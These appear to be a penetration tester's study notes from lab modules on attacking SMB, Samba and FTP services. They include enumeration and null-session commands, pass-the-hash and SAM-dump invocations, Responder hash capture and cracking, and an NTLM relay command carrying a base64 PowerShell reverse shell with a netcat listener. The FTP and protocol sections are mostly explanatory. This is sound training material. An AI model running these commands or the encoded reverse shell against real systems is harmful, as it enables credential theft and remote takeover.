        > Once we have access to the database using a command-line utility or a GUI application, we can use common Transact-SQL statements(https://docs.microsoft.com/en-us/sql/t-sql/statements/statements?view=sql-server-ver15) to enumerate databases and tables containing sensitive information such as usernames and passwords. If we have the correct privileges, we could potentially execute commands as the MSSQL service account. Later in this module, we will discuss common Transact-SQL statements and attacks for MSSQL & MySQL databases.

* Tools to interact with common services
SMB	            FTP	        Email	        Databases
smbclient	    ftp	        Thunderbird	    mssql-cli
CrackMapExec	lftp	    Claws	        mycli
SMBMap	        ncftp	    Geary	        mssqlclient.py
Impacket	    filezilla	MailSpring	    dbeaver
psexec.py	    crossftp	mutt	        MySQL Workbench
smbexec.py		            mailutils	    SQL Server Management Studio or SSMS
		                    sendEmail	
		                    swaks	
		                    sendmail

https://www.samba.org/samba/docs/current/man-html/smbclient.1.html
https://linux.die.net/man/1/ftp
https://www.thunderbird.net/en-US/
https://github.com/dbcli/mssql-cli
https://github.com/byt3bl33d3r/CrackMapExec
https://lftp.yar.ru/
https://www.claws-mail.org/
https://github.com/dbcli/mycli
https://github.com/ShawnDEvans/smbmap
https://www.ncftp.com/
https://wiki.gnome.org/Apps/Geary
https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py
https://github.com/SecureAuthCorp/impacket
https://filezilla-project.org/
https://getmailspring.com/
https://github.com/dbeaver/dbeaver
https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py
http://www.crossftp.com/
http://www.mutt.org/
https://dev.mysql.com/downloads/workbench/
https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py
https://mailutils.org/
https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms
https://github.com/mogaal/sendemail
http://www.jetmore.org/john/code/swaks/
https://en.wikipedia.org/wiki/Sendmail








	> Originally, SMB ran on top of NetBIOS using port 139
      	The SMB protocol utilizes two levels of authentication(Both of these authentication levels utilize a challenge response authentication system), namely:
      		+ User authentication: Users must provide a username and password in order to authenticate with the SMB server in order to access a share
      	  	+ Share authentication: Users must provide a password in order to access restricted share
* Samba
	> There is an alternative variant to the SMB server, called Samba, developed for Unix-based operating system. Samba implements the Common Internet File System (CIFS) network protocol. CIFS is a "dialect" of SMB. In other words, CIFS is a very specific implementation of the SMB protocol, which in turn was created by Microsoft. This allows Samba to communicate with newer Windows systems. Therefore, it usually is referred to as SMB / CIFS. However, CIFS is the extension of the SMB protocol. So when we pass SMB commands over Samba to an older NetBIOS service, it usually connects to the Samba server over TCP ports 137, 138, 139, but CIFS uses TCP port 445 only. There are several versions of SMB, including outdated versions that are still used in specific infrastructures.
    > Samba is a Unix/Linux-based open-source implementation of the SMB protocol. It also allows Linux/Unix servers and Windows clients to use the same SMB services.
        ! For instance, on Windows, SMB can run directly over port 445 TCP/IP without the need for NetBIOS over TCP/IP, but if Windows has NetBIOS enabled, or we are targetting a non-Windows host, we will find SMB running on port 139 TCP/IP. This means that SMB is running with NetBIOS over TCP/IP.
	SMB Version	Supported				Features
	CIFS		Windows NT 4.0				Communication via NetBIOS interface
	SMB 1.0		Windows 2000				Direct connection via TCP
	SMB 2.0		Windows Vista, Windows Server 2008	Performance upgrades, improved message signing, caching feature
	SMB 2.1		Windows 7, Windows Server 2008 R2	Locking mechanisms
	SMB 3.0		Windows 8, Windows Server 2012		Multichannel connections, end-to-end encryption, remote storage access
	SMB 3.0.2	Windows 8.1, Windows Server 2012 R2	
	SMB 3.1.1	Windows 10, Windows Server 2016		Integrity checking, AES-128 encryption

	> With version 3, the Samba server gained the ability to be a full member of an Active Directory domain. With version 4, Samba even provides an Active Directory domain controller. It contains several so-called daemons for this purpose - which are Unix background programs. The SMB server daemon (smbd) belonging to Samba provides the first two functionalities, while the NetBIOS message block daemon (nmbd) implements the last two functionalities. The SMB service controls these two background programs.

	> We know that Samba is suitable for both Linux and Windows systems. In a network, each host participates in the same workgroup. A workgroup is a group name that identifies an arbitrary collection of computers and their resources on an SMB network. There can be multiple workgroups on the network at any given time. IBM developed an application programming interface (API) for networking computers called the Network Basic Input/Output System (NetBIOS). The NetBIOS API provided a blueprint for an application to connect and share data with other computers. In a NetBIOS environment, when a machine goes online, it needs a name, which is done through the so-called name registration procedure. Either each host reserves its hostname on the network, or the NetBIOS Name Server (NBNS => https://networkencyclopedia.com/netbios-name-server-nbns/) is used for this purpose. It also has been enhanced to Windows Internet Name Service (WINS => https://networkencyclopedia.com/windows-internet-name-service-wins/).
	[+] Default configuration ==> https://www.samba.org/samba/docs/current/man-html/smb.conf.5.html
		> cat /etc/samba/smb.conf | grep -v "#\|\;"
		Setting				Description
		[sharename]			The name of the network share.
		workgroup = WORKGROUP/DOMAIN	Workgroup that will appear when clients query.
		path = /path/here/		The directory to which user is to be given access.
		server string = STRING		The string that will show up when a connection is initiated.
		unix password sync = yes	Synchronize the UNIX password with the SMB password?
		usershare allow guests = yes	Allow non-authenticated users to access defined shared?
		map to guest = bad user		What to do when a user login request doesn't match a valid UNIX user?
		browseable = yes		Should this share be shown in the list of available shares?
		guest ok = yes			Allow connecting to the service without using a password?
		read only = yes			Allow users to read files only?
		create mask = 0700		What permissions need to be set for newly created files?
	[+] Dangerous settings
		Setting				Description
		browseable = yes		Allow listing available shares in the current share?
		read only = no			Forbid the creation and modification of files?
		writable = yes			Allow users to create and modify files?
		guest ok = yes			Allow connecting to the service without using a password?
		enable privileges = yes		Honor privileges assigned to specific SID?
		create mask = 0777		What permissions must be assigned to the newly created files?
		directory mask = 0777		What permissions must be assigned to the newly created directories?
		logon script = script.sh	What script needs to be executed on the user's login?
		magic script = script.sh	Which script should be executed when the script gets closed?
		magic output = script.out	Where the output of the magic script needs to be stored?
	> Restart Samba
		sudo systemctl restart smbd
	> List files
		smbclient -N -L //192.168.188.138
	> Execute commands with smbclient
		Smbclient also allows us to execute local system commands using an exclamation mark at the beginning (!<cmd>) without interrupting the connection.
			!cat pre-prod.txt
	> From the administrative point of view, we can check these connections using smbstatus. Apart from the Samba version, we can also see who, from which host, and which share the client is connected. This is especially important once we have entered a subnet (perhaps even an isolated one) that the others can still access. For example, with domain-level security, the samba server acts as a member of a Windows domain. Each domain has at least one domain controller, usually a Windows NT server providing password authentication. This domain controller provides the workgroup with a definitive password server. The domain controllers keep track of users and passwords in their own Security Authentication Module (SAM) and authenticate each user when they log in for the first time and wish to access another machine's share.

	[+] Nmap
		❯ sudo nmap 192.168.188.138 -sV -sC -p139,445
	
	> We can see from the results that it is not very much that Nmap provided us with here. Therefore, we should resort to other tools that allow us to interact manually with the SMB and send specific requests for the information. One of the handy tools for this is rpcclient. This is a tool to perform MS-RPC functions. The Remote Procedure Call (RPC) is a concept and, therefore, also a central tool to realize operational and work-sharing structures in networks and client-server architectures. The communication process via RPC includes passing parameters and the return of a function value. ==> https://www.geeksforgeeks.org/remote-procedure-call-rpc-in-operating-system/
        > https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf

		rpcclient -U "" 192.168.188.138
			Query			Description
			srvinfo			Server information.
			enumdomains		Enumerate all domains that are deployed in the network.
			querydominfo		Provides domain, server, and user information of deployed domains.
			netshareenumall		Enumerates all available shares.
			netsharegetinfo <share>	Provides information about a specific share.
			enumdomusers		Enumerates all domain users.
			queryuser <RID>		Provides information about a specific user.
			querydispinfo

	> Brute forcing User RIDs
		With loop in bash
			for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
		With samrdump.py
			samrdump.py 192.168.188.138	
	> We could also use:
		smbmap -H 10.129.14.128
		crackmapexec smb 10.129.14.128 --shares -u '' -p ''
		enum4linux-ng
			git clone https://github.com/cddmp/enum4linux-ng.git
			cd enum4linux-ng
			pip3 install -r requirements.txt
			./enum4linux-ng.py 192.168.188.138 -A



* Creating network shares is fairly easy. Generally, users just need to turn on the:
    	> 'File and Printer Sharing' service
    	[+] Starting from Windows Vista, users can choose to share:
    		> Single file
    		  	They can choose local or remote users to share the file with
    		> Public directory
    		  	They can choose which local users can access the files on the share, but they can ONLY allow everyone or no one in the network to access the share

    		> UNC Paths
    			An authorized user can access shares by using Universal Naming Convention paths. The format of a UNC path is:
    		  		\\ServerName\ShareName\file.txt

    		> Administrative shares
    			There are also some special default administrative shares which are used by system administrators and Windows itself:
    				\\ComputerName\C$ 
    		    			Lets an administrator access a volume on the local machine. Every volume has a share (C$, D$, E$, etc)
    		    		\\ComputerName\admin$
    		    			Points to the windows installation directory
    		    		\\ComputerName\ipc$ 
    		    			Is used for inter-process communication. You cannot browse it via Windows Explorer. The IPC$ share is also known as a null session connection. By using this session, Windows lets anonymous users perform certain activities, such as enumerating the names of domain accounts and network shares
* Enumerating Windows Shares
	> In Windows OS 
    		> nbtstat -A <target IP> //Displays information about a target
    		  	Example of results
    		  		ELS-WINXP <00> UNIQUE Registered 
    		  	    	ELS-WINXP <20> UNIQUE Registered 
    		  	    		  <00> : Tells us that ELS-WINXP is a workstation 
    		  	    	UNIQUE: This computer must have only one IP address assigned
    		  	    		  <20> : Tells us that the file sharing service is up and running on the machine.
    		> net view <target IP>
    	> In LinuxOS 
    		> nbmlookup -A <target IP>
    	    		If <20>, there is a server that we can actually connect to it.
    		> smbclient -L //<IP> -N //It also displays administrative shares that are hidden when using Windows standard tools
		  smbclient \\\\10.129.42.253\\users -U bob
    	  	> nbtscan -r 192.168.188.0/24

* Null sessions: Nowadays Windows is configured to be inmune from this kind of attack. However, legacy hosts can still be vulnerable. Check it:
  	> In Windows
  		net use \\<target IP address>\IPC$ '' /u:'' //IPC$ is an example
  	> In Linux
  	  	smbclient //<target IP address>/IPC$ -N
  	> We could automate this:
  	  	while IFS= read -r users; do smbclient //demo.ine.local/$users -N;done < users.txt
  	> Instead of downloading the file locally, we could see it with the '-'. This parameter is the local file where the content of remote file must be saved.
  	  	get flag_1 -

	[+] Exploiting Null sessions
  	  	> With Windows
  	  		> Using Enum (https://packetstormsecurity.com/search/?q=win32+enum&s=files)      
  	  			enum -S <target IP> //Enumerate the shares of a machine. Administrative shares too.
  	  		    	enum -U <target IP> //Enumerate users
  	  		    	enum -P <target IP> //If you need to mount a network authentication attack, you can check the password policy.
  	  		> Using Winfo (https://packetstormsecurity.com/search/?q=winfo&s=files)
  	  			winfo <target IP> -n //To use null session

  	  	> With Linux
  	  		enum4linux
  	  			-U  get userlist
  	  			-M  get machine list
  	  		    	-N  get namelist dump (different from -U and-M)
  	  		    	-S  get sharelist
  	  		    	-P  get password policy information
  	  		    	-G  get group and member list
  	  		    	-a  all of the aboveIFS (full basic enumeration)
  	  		    	-I  get about LDAP running on the server
  	  		    	-i  printer information
  	  		    	-n  nbmlookup
				-o	Get OS information
  	  		    	-s  brute force gwhiuessing for share names // /usr/share/enum4linux/share-list.txt // ~/Desktop/wordlists/100-common-passwords.txt
    	  		enum4linux -r -u "admin" -p "password1" 192.168.188.128 //Search for users

		> Impacket-samrdump
  	  		impacket-samrdump <target IP>

  	  	> Nmap
  	  		nmap --script=smb-enum-shares <target IP >
  	  		nmap --script=smb-enum-users <target IP>
  	  		nmap --script=smb-bute <target IP>

		> In Windows machine
    			net use z: \\192.168.188.128\c$ /u:admin passloquesea
    	  		net use * /delete
    	  		net use z: \\192.168.188.128\c$ /u:admin * [This is for not type the password]
    	Nmap scripts
    		nmap -p445 --script smb-protocols 192.168.188.128
    	  	--script smb-security-mode
    	  	nmap -p445 --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=smbserver_771 192.168.188.138
    	  	smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=smbserver_771 
    	  	smb-enum-users --script-args smbusername=administrator,smbpassword=smbserver_771 
    	  	smb-server-stats --script-args smbusername=administrator,smbpassword=smbserver_771 
    	  	smb-enum-domains --script-args smbusername=administrator,smbpassword=smbserver_771 
    	  	smb-enum-groups --script-args smbusername=administrator,smbpassword=smbserver_771 
    	  	smb-enum-services --script-args smbusername=administrator,smbpassword=smbserver_771 
    	smbmap
    		smbmap -H 10.129.2.5 -u null
    	  	smbmap -u guest -p "" -d . -H 192.168.188.128
    	  	smbmap -u administrator -p smbserver_771 -H 192.168.188.128 -x ipconfig
    	  	smbmap -u administrator -p smbserver_771 -H 192.168.188.128 -L //List all drives on the specified host
    	  	smbmap -u administrator -p smbserver_771 -H 192.168.188.128 -r 'C$'
    	  	smbmap -u administrator -p smbserver_771 -H 192.168.188.128 --upload 'root/backdoortohackyou' 'C$\backdoor'
    	  	smbmap -u administrator -p smbserver_771 -H 192.168.188.128 --download 'C$\flag.txt'
    	  	smbmap -H 10.129.117.106 -R --depth 5
    	msfconsole
    		use auxiliary/scanner/smb/smb_version
    	  	use auxiliary/scanner/smb/smb2
    	  	use auxiliary/scanner/smb/smb_enumshares
    	  	use auxiliary/scanner/smb/smb_login ==> Brute force
    	  	  set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt
    	  	  set smbuser
    	  	use auxiliary/scanner/smb/pipe_auditor
    	rpcclient
    	  	rpcclient -U "" -N 192.168.188.128 -c "enumdomusers"
    	  	srvinfo
    	  	lookupnames admin

> Linux and Windows SMB servers provide different attack paths. Usually, we will only get access to the file system, abuse privileges, or exploit known vulnerabilities in a Linux environment, as we will discuss later in this section. However, in Windows, the attack surface is more significant.

> When attacking a Windows SMB Server, our actions will be limited by the privileges we had on the user we manage to compromise. If this user is an Administrator or has specific privileges, we will be able to perform operations such as:
    Remote Command Execution
    Extract Hashes from SAM Database
    Enumerating Logged-on Users
    Pass-the-Hash (PTH)

> Let's discuss how we can perform such operations. Additionally, we will learn how the SMB protocol can be abused to retrieve a user's hash as a method to escalate privileges or gain access to a network.

* Remote Code Execution (RCE)
    > Before jumping into how to execute a command on a remote system using SMB, let's talk about Sysinternals. The Windows Sysinternals website was created in 1996 by Mark Russinovich and Bryce Cogswell to offers technical resources and utilities to manage, diagnose, troubleshoot, and monitor a Microsoft Windows environment. Microsoft acquired Windows Sysinternals and its assets on July 18, 2006.

    > Sysinternals featured several freeware tools to administer and monitor computers running Microsoft Windows. The software can now be found on the Microsoft website(https://docs.microsoft.com/en-us/sysinternals/). One of those freeware tools to administer remote systems is PsExec.
    > PsExec(https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) is a tool that lets us execute processes on other systems, complete with full interactivity for console applications, without having to install client software manually. It works because it has a Windows service image inside of its executable. It takes this service and deploys it to the admin$ share (by default) on the remote machine. It then uses the DCE/RPC interface over SMB to access the Windows Service Control Manager API. Next, it starts the PSExec service on the remote machine. The PSExec service then creates a named pipe that can send commands to the system.

We can download PsExec from Microsoft website, or we can use some Linux implementations:

    Impacket PsExec - Python PsExec like functionality example using RemComSvc(https://github.com/kavika13/RemCom).
    Impacket SMBExec - A similar approach to PsExec without using RemComSvc. The technique is described here. This implementation goes one step further, instantiating a local SMB server to receive the output of the commands. This is useful when the target machine does NOT have a writeable share available.
    Impacket atexec - This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.
    CrackMapExec - includes an implementation of smbexec and atexec.
    Metasploit PsExec - Ruby PsExec implementation.

    > To connect to a remote machine with a local administrator account, using impacket-psexec, you can use the following command:
        m1l0js@htb[/htb]$ impacket-psexec administrator:'Password123!'@10.10.110.17
    > The same options apply to impacket-smbexec and impacket-atexec.

    + CrackMapExec
        > Another tool we can use to run CMD or PowerShell is CrackMapExec. One advantage of CrackMapExec is the availability to run a command on multiples host at a time. To use it, we need to specify the protocol, smb, the IP address or IP address range, the option -u for username, and -p for the password, and the option -x to run cmd commands or uppercase -X to run PowerShell commands.
            m1l0js@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
        ! Note: If the--exec-method is not defined, CrackMapExec will try to execute the atexec method, if it fails you can try to specify the --exec-method smbexec.
    > Enumerating Logged-on Users

        + Imagine we are in a network with multiple machines. Some of them share the same local administrator account. In this case, we could use CrackMapExec to enumerate logged-on users on all machines within the same network 10.10.110.17/24, which speeds up our enumeration process.
            m1l0js@htb[/htb]$ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users

    > Extract Hashes from SAM Database

        + The Security Account Manager (SAM) is a database file that stores users' passwords. It can be used to authenticate local and remote users. If we get administrative privileges on a machine, we can extract the SAM database hashes for different purposes:

            - Authenticate as another user.
            - Password Cracking, if we manage to crack the password, we can try to reuse the password for other services or accounts.
            - Pass The Hash. We will discuss it later in this section.
            
            m1l0js@htb[/htb]$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
    > Pass-the-Hash (PtH)

        + If we manage to get an NTLM hash of a user, and if we cannot crack it, we can still use the hash to authenticate over SMB with a technique called Pass-the-Hash (PtH). PtH allows an attacker to authenticate to a remote server or service using the underlying NTLM hash of a user's password instead of the plaintext password. We can use a PtH attack with any Impacket tool, SMBMap, CrackMapExec, among other tools. Here is an example of how this would work with CrackMapExec:
            m1l0js@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE

* Forced Authentication Attacks

    > We can also abuse the SMB protocol by creating a fake SMB Server to capture users' NetNTLM v1/v2 hashes (https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4)
    > The most common tool to perform such operations is the Responder. Responder(https://github.com/lgandx/Responder) is an LLMNR, NBT-NS, and MDNS poisoner tool with different capabilities, one of them is the possibility to set up fake services, including SMB, to steal NetNTLM v1/v2 hashes. In its default configuration, it will find LLMNR and NBT-NS traffic. Then, it will respond on behalf of the servers the victim is looking for and capture their NetNTLM hashes.
    > Let's illustrate an example to understand better how Responder works. Imagine we created a fake SMB server using the Responder default configuration, with the following command:
        m1l0js@htb[/htb]$ responder -I <interface name>

    > When a user or a system tries to perform a Name Resolution (NR), a series of procedures are conducted by a machine to retrieve a host's IP address by its hostname. On Windows machines, the procedure will roughly be as follows:

        + The hostname file share's IP address is required.
        + The local host file (C:\Windows\System32\Drivers\etc\hosts) will be checked for suitable records.
        + If no records are found, the machine switches to the local DNS cache, which keeps track of recently resolved names.
        + Is there no local DNS record? A query will be sent to the DNS server that has been configured.
        + If all else fails, the machine will issue a multicast query, requesting the IP address of the file share from other machines on the network.

    > Suppose a user mistyped a shared folder's name \\mysharefoder\ instead of \\mysharedfolder\. In that case, all name resolutions will fail because the name does not exist, and the machine will send a multicast query to all devices on the network, including us running our fake SMB server. This is a problem because no measures are taken to verify the integrity of the responses. Attackers can take advantage of this mechanism by listening in on such queries and spoofing responses, leading the victim to believe malicious servers are trustworthy. This trust is usually used to steal credentials.

        m1l0js@htb[/htb]$ sudo responder -I ens33
    > These captured credentials can be cracked using hashcat or relayed to a remote host to complete the authentication and impersonate the user.
    > All saved Hashes are located in Responder's logs directory (/usr/share/responder/logs/). We can copy the hash to a file and attempt to crack it using the hashcat module 5600.
    ! Note: If you notice multiples hashes for one account this is because NTLMv2 utilizes both a client-side and server-side challenge that is randomized for each interaction. This makes it so the resulting hashes that are sent are salted with a randomized string of numbers. This is why the hashes don't match but still represent the same password.
        m1l0js@htb[/htb]$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
    > The NTLMv2 hash was cracked. The password is P@ssword. If we cannot crack the hash, we can potentially relay the captured hash to another machine using impacket-ntlmrelayx(https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) or Responder MultiRelay.py(https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py). Let us see an example using impacket-ntlmrelayx.
    > First, we need to set SMB to OFF in our responder configuration file (/etc/responder/Responder.conf).
        m1l0js@htb[/htb]$ cat /etc/responder/Responder.conf | grep 'SMB ='
        SMB = Off
    > Then we execute impacket-ntlmrelayx with the option --no-http-server, -smb2support, and the target machine with the option -t. By default, impacket-ntlmrelayx will dump the SAM database, but we can execute commands by adding the option -c.
        m1l0js@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146

    > We can create a PowerShell reverse shell using https://www.revshells.com/, set our machine IP address, port, and the option Powershell #3 (Base64).
        m1l0js@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAMgAwAC4AMQAzADMAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
    > Once the victim authenticates to our server, we poison the response and make it execute our command to obtain a reverse shell.
        m1l0js@htb[/htb]$ nc -lvnp 9001

* Latest SMB vulnerabilities
    > One recent significant vulnerability that affected the SMB protocol was called SMBGhost with the CVE-2020-0796. The vulnerability consisted of a compression mechanism of the version SMB v3.1.1 which made Windows 10 versions 1903 and 1909 vulnerable to attack by an unauthenticated attacker. The vulnerability allowed the attacker to gain remote code execution (RCE) and full access to the remote target system.
    + The Concept of the Attack
        > In simple terms, this is an integer overflow vulnerability in a function of an SMB driver that allows system commands to be overwritten while accessing memory. An integer overflow results from a CPU attempting to generate a number that is greater than the value required for the allocated memory space. Arithmetic operations can always return unexpected values, resulting in an error. An example of an integer overflow can occur when a programmer does not allow a negative number to occur. In this case, an integer overflow occurs when a variable performs an operation that results in a negative number, and the variable is returned as a positive integer. This vulnerability occurred because, at the time, the function lacked bounds checks to handle the size of the data sent in the process of SMB session negotiation.
        > The vulnerability occurs while processing a malformed compressed message after the Negotiate Protocol Responses. If the SMB server allows requests (over TCP/445), compression is generally supported, where the server and client set the terms of communication before the client sends any more data. Suppose the data transmitted exceeds the integer variable limits due to the excessive amount of data. In that case, these parts are written into the buffer, which leads to the overwriting of the subsequent CPU instructions and interrupts the process's normal or planned execution. These data sets can be structured so that the overwritten instructions are replaced with our own ones, and thus we force the CPU (and hence also the process) to perform other tasks and instructions.





####FTP
* The File Transfer Protocol (FTP) is one of the oldest protocols on the Internet. The FTP runs within the application layer of the TCP/IP protocol stack. Thus, it is on the same layer as HTTP or POP. These protocols also work with the support of browsers or email clients to perform their services. There are also special FTP programs for the File Transfer Protocol.
* Let us imagine that we want to upload local files to a server and download other files using the FTP protocol. In an FTP connection, two channels are opened. First, the client and server establish a control channel through TCP port 21. The client sends commands to the server, and the server returns status codes. Then both communication participants can establish the data channel via TCP port 20. This channel is used exclusively for data transmission, and the protocol watches for errors during this process. If a connection is broken off during transmission, the transport can be resumed after re-established contact.
* A distinction is made between active and passive FTP. In the active variant, the client establishes the connection as described via TCP port 21 and thus informs the server via which client-side port the server can transmit its responses. However, if a firewall protects the client, the server cannot reply because all external connections are blocked. For this purpose, the passive mode has been developed. Here, the server announces a port through which the client can establish the data channel. Since the client initiates the connection in this method, the firewall does not block the transfer.


* FTP commands
	https://www.smartfile.com/blog/the-ultimate-ftp-commands-list/
	COMMAND		WHAT IT DOES
	!		Runs the specified command on the local computer
	?		Displays descriptions for ftp commands
	append		Appends a local file to a file on the remote computer
	ascii		Sets the file transfer type to ASCII, the default
	bell		Toggles a bell to ring after each file transfer command is completed (default = OFF)
	binary		Sets the file transfer type to binary
	bye		Ends the FTP session and exits ftp
	cd		Changes the working directory on the remote computer
	close		Ends the FTP session and returns to the command interpreter
	debug		Toggles debugging (default = OFF)
	delete		Deletes a single file on a remote computer
	dir		Displays a list of a remote directory’s files and subdirectories
	disconnect	Disconnects from the remote computer, retaining the ftp prompt
	get		Copies a single remote file to the local computer
	glob		Toggles filename globbing (wildcard characters) (default = ON)
	hash		Toggles hash sign (#) printing for each data block transferred (default = OFF)
	help		Displays descriptions for ftp commands
	lcd		Changes the working directory on the local computer
	literal		Sends arguments, verbatim, to the remote FTP server
	ls		Displays an abbreviated list of a remote directory’s files and subdirectories
	mdelete		Deletes one or more files on a remote computer
	mdir		Displays a list of a remote directory’s files and subdirectories
	mget		Copies one or more remote files to the local computer
	mkdir		Creates a remote directory
	mls		Displays an abbreviated list of a remote directory’s files and subdirectories
	mput		Copies one or more local files to the remote computer
	open		Connects to the specified FTP server
	prompt		Toggles prompting (default = ON)
	put		Copies a single local file to the remote computer
	pwd		Displays the current directory on the remote computer (literally, “print working directory”)
	quit		Ends the FTP session with the remote computer and exits ftp (same as “bye”)
	quote		Sends arguments, verbatim, to the remote FTP server (same as “literal”)
	recv		Copies a remote file to the local computer
	remotehelp	Displays help for remote commands
	rename		Renames remote files
	rmdir		Deletes a remote directory
	send		Copies a local file to the remote computer (same as “put”)
	status		Displays the current status of FTP connections
	trace		Toggles packet tracing (default = OFF)
	type		Sets or displays the file transfer type (default = ASCII)
	user		Specifes a user to the remote computer
	verbose		Toggles verbose mode (default = ON)
* FTP command line
	COMMAND	WHAT IT DOES
	-v		Suppresses verbose display of remote server responses.
	-n		Suppresses auto login
	-i		Turns off interactive prompting during multiple file transfers.
	-d		Enables debugging, displaying all ftp commands passed between the client and server.
	–g		Disables filename globbing, which permits the use of wildcard chracters in local file and path names.
	-s:filename	Specifies a text file containing ftp commands; the commands will automatically run after ftp starts. No spaces are allowed in this parameter. Use this switch instead of redirection (>).
	-a		Use any local interface when binding data connection.
	-w:windowsize	Overrides the default transfer buffer size of 4096.
	-computer	Specifies the computer name or IP address of the remote computer to connect to. The computer, if specified, must be the last parameter on the line.
* FTP server status codes
	https://en.wikipedia.org/wiki/List_of_FTP_server_return_codes
* TFTP
	> Trivial File Transfer Protocol (TFTP) is simpler than FTP and performs file transfers between client and server processes. However, it does not provide user authentication and other valuable features supported by FTP. In addition, while FTP uses TCP, TFTP uses UDP, making it an unreliable protocol and causing it to use UDP-assisted application layer recovery.

	> This is reflected, for example, in the fact that TFTP, unlike FTP, does not require the user's authentication. It does not support protected login via passwords and sets limits on access based solely on the read and write permissions of a file in the operating system. Practically, this leads to TFTP operating exclusively in directories and with files that have been shared with all users and can be read and written globally. Because of the lack of security, TFTP, unlike FTP, may only be used in local and protected networks
	> Unlike the FTP client, TFTP does not have directory listing functionality.
	> Few commands
		Commands	Description
		connect		Sets the remote host, and optionally the port, for file transfers.
		get		Transfers a file or set of files from the remote host to the local host.
		put		Transfers a file or set of files from the local host onto the remote host.
		quit		Exits tftp.
		status		Shows the current status of tftp, including the current transfer mode (ascii or binary), connection status, time-out value, and so on.
		verbose		Turns verbose mode, which displays additional information during file transfer, on or off.
* Default configuration
	> One of the most used FTP servers on Linux-based distributions is vsFTPd. The default configuration of vsFTPd can be found in /etc/vsftpd.conf, and some settings are already predefined by default. The configuration file does not contain all possible settings that can be made
	❯ cat /etc/vsftpd.conf  | grep -v '#'
	Setting							Description
	listen=NO						Run from inetd or as a standalone daemon?
	listen_ipv6=YES						Listen on IPv6 ?
	anonymous_enable=NO					Enable Anonymous access?
	local_enable=YES					Allow local users to login?
	dirmessage_enable=YES					Display active directory messages when users go into certain directories?
	use_localtime=YES					Use local time?
	xferlog_enable=YES					Activate logging of uploads/downloads?
	connect_from_port_20=YES				Connect from port 20?
	secure_chroot_dir=/var/run/vsftpd/empty			Name of an empty directory
	pam_service_name=vsftpd					This string is the name of the PAM service vsftpd will use.
	rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem	The last three options specify the location of the RSA certificate to use for SSL encrypted connections.
	rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key	
	ssl_enable=NO
	> In addition, there is a file called /etc/ftpusers that we also need to pay attention to, as this file is used to deny certain users access to the FTP service. In the following example, the users guest, john, and kevin are not permitted to log in to the FTP service, even if they exist on the Linux system
